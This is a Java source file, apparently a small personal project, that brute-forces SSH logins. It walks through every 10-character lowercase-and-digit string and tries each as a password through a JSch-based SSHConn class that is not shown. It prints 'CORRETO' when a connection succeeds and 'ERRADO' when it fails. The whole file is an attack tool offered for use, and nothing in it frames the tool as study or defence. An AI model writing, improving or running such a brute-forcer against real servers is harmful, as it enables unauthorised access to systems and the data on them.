/**
 * Created by ricar on 24/11/2015.
 */

import com.jcraft.jsch.JSchException;

import java.util.Iterator;

public class bruteForce {

    public static void main(String[] args) {
        new SequentialPatternGenerator().start();
    }
}

class SequentialPatternGenerator extends Thread implements Iterator<String> {

    private static final char[] CHOICES = new char[]{'a', 'b', 'c', 'd', 'e', 'f',
            'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};


    private static final int MAX_INDEX = CHOICES.length - 1;
    private boolean keepProducing = true;
    private final int[] indexes;

    public void run(){
    }

    public SequentialPatternGenerator() {
        int length=10;
        indexes = new int[length];
        initIndexes();
        while(keepProducing) {
            next();
        }
    }

    private void initIndexes() {
        for (int i = 0; i < indexes.length; i++) {
            indexes[i] = 0;
        }
    }

    @Override
    public boolean hasNext() {
        if (!keepProducing) {
            return false;
        }

        for (int i = 0; i < indexes.length; i++) {
            if (indexes[i] < MAX_INDEX) {
                return true;
            }
        }

        return false;
    }

    @Override
    public String next() {
        if (!keepProducing || !hasNext()) {
            return null;
        }

        String next = produceString();
        //System.out.println(next);

        try {
            SSHConn conn = new SSHConn(next);
            System.out.println("CORRETO!!!!");
            keepProducing = false;
        } catch (JSchException e) {
            System.out.println("ERRADO!!!!");
        }

        adjustIndexes();

        return next;
    }

    private String produceString() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < indexes.length; i++) {
            sb.append(CHOICES[indexes[i]]);
        }

        return sb.toString();
    }

    private void adjustIndexes() {
        int i;
        for(i = 0 ; i < indexes.length ; i++) {
            if(indexes[i] < MAX_INDEX) {
                indexes[i] = indexes[i] + 1;
                break;
            }
        }

        for(int j=0; j < i; j++) {
            indexes[j] = 0;
        }
    }
}
